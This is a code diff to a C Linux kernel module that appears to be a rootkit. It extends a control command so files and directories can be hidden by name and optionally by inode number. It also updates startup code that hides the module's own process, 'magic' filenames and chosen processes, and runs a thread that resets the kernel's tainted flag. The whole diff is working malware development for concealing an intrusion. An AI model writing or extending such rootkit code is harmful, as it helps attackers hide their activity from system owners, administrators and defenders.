@@ -490,14 +490,32 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             /* list hidden tasks */
         } else if(!strcmp(buf, "-s")) {
             kv_show_saved_tasks();
-            /* add name to the list of hidden files/directories */
+            /* add name to the list of hidden files/directories
+             * and inode, is present.
+             * */
         } else if(!strncmp(buf, "-a", MIN(2, size))) {
+            int ino = 0;
             char *s = &buf[3];
-            s[strcspn(s, " ")] = 0;
-            if (strlen(s)) {
-                const char *tmp[] = {s,NULL};
-                fs_add_name_rw(tmp);
+            char *number_str;
+            const char *tmp[] = {NULL, NULL};
+            int ok = 1;
+
+            s[strcspn(s, "\n")] = 0;
+
+            // Find the first space in the input to separate name and number
+            number_str = strchr(s, ' ');
+            if (number_str) {
+                *number_str++ = '\0';
+            } else {
+                number_str = "";
             }
+
+            *tmp = s;
+            if (*number_str)
+                ok = !kstrtoint(number_str, 10, &ino);
+
+            if (ok)
+                fs_add_name_rw(tmp, ino);
             /* unhide file/directory */
         } else if(!strncmp(buf, "-d", MIN(2, size))) {
             char *s = &buf[3];
@@ -744,7 +762,7 @@ static int __init kv_init(void) {
     if (!tsk_prc)
         goto unroll_init;
 
-    fs_add_name_ro(hideprocname);
+    fs_add_name_ro(hideprocname, 0);
 
     tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
     if (!tsk_tainted)
@@ -767,10 +785,10 @@ cont:
     kv_hide_task_by_pid(tsk_tainted->pid, 0, CHILDREN);
 
     /** hide magic filenames & directories */
-    fs_add_name_ro(kv_hide_str_on_load);
+    fs_add_name_ro(kv_hide_str_on_load, 0);
 
     /** hide magic filenames, directories and processes */
-    fs_add_name_ro(kv_get_hide_ps_names());
+    fs_add_name_ro(kv_get_hide_ps_names(), 0);
 
     kv_scan_and_hide();
 
